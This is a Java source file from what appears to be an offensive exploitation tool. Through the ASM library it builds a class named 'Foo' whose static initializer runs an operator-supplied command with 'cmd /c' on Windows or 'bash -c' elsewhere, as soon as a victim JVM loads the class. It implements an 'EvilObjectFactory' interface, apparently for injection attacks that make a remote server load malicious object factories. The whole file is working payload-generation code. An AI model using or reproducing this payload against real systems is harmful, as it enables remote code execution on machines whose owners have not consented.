package asm;

import asm.ofi.EvilObjectFactory;
import cli.Config;
import jdk.internal.org.objectweb.asm.*;

/**
 * Execute command at Linux or Windows
 */
public class ExecObjectFactory implements EvilObjectFactory, Opcodes {

    @Override
    public byte[] getObjectFactory() {
        ClassWriter classWriter = new ClassWriter(0);
        MethodVisitor methodVisitor;

        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "Foo", null, "java/lang/Object", null);

        classWriter.visitSource("Foo.java", null);

        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(1, label0);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            methodVisitor.visitInsn(RETURN);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLocalVariable("this", "LFoo;", null, label0, label1, 0);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(4, label0);
            methodVisitor.visitLdcInsn("os.name");
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/System", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;", false);
            methodVisitor.visitVarInsn(ASTORE, 0);
            Label label3 = new Label();
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(5, label3);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitLdcInsn("Windows");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "startsWith", "(Ljava/lang/String;)Z", false);
            Label label4 = new Label();
            methodVisitor.visitJumpInsn(IFEQ, label4);
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            methodVisitor.visitLineNumber(6, label5);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            methodVisitor.visitInsn(ICONST_3);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/String");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitLdcInsn("cmd");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitLdcInsn("/c");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_2);
            methodVisitor.visitLdcInsn(Config.getGlobalInstance().command);
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitJumpInsn(GOTO, label1);
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLineNumber(8, label4);
            methodVisitor.visitFrame(Opcodes.F_APPEND, 1, new Object[]{"java/lang/String"}, 0, null);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            methodVisitor.visitInsn(ICONST_3);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/String");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitLdcInsn("bash");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitLdcInsn("-c");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_2);
            methodVisitor.visitLdcInsn(Config.getGlobalInstance().command);
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(11, label1);
            methodVisitor.visitFrame(Opcodes.F_CHOP, 1, null, 0, null);
            Label label6 = new Label();
            methodVisitor.visitJumpInsn(GOTO, label6);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(10, label2);
            methodVisitor.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"java/lang/Exception"});
            methodVisitor.visitVarInsn(ASTORE, 0);
            methodVisitor.visitLabel(label6);
            methodVisitor.visitLineNumber(12, label6);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitInsn(RETURN);
            methodVisitor.visitLocalVariable("os", "Ljava/lang/String;", null, label3, label1, 0);
            methodVisitor.visitMaxs(5, 1);
            methodVisitor.visitEnd();
        }
        classWriter.visitEnd();

        return classWriter.toByteArray();
    }
}
